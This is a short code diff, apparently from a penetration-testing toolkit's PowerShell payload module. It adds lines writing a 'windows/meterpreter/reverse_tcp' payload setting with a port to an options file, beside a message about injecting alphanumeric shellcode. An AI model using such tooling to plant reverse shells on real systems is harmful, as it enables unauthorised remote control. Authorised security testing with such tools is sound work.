@@ -26,6 +26,11 @@ if powershell_menu_choice != "99":
         update_options("PORT=" + port)
         update_options("POWERSHELL_SOLO=ON")
         print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
+
+        filewrite = file(setdir + "/payload_options.shellcode", "w")
+        filewrite.write("windows/meterpreter/reverse_tcp " + port + ",")
+        filewrite.close()
+
         try: reload(src.payloads.powershell.prep)
         except: import src.payloads.powershell.prep
         # create the directory if it does not exist
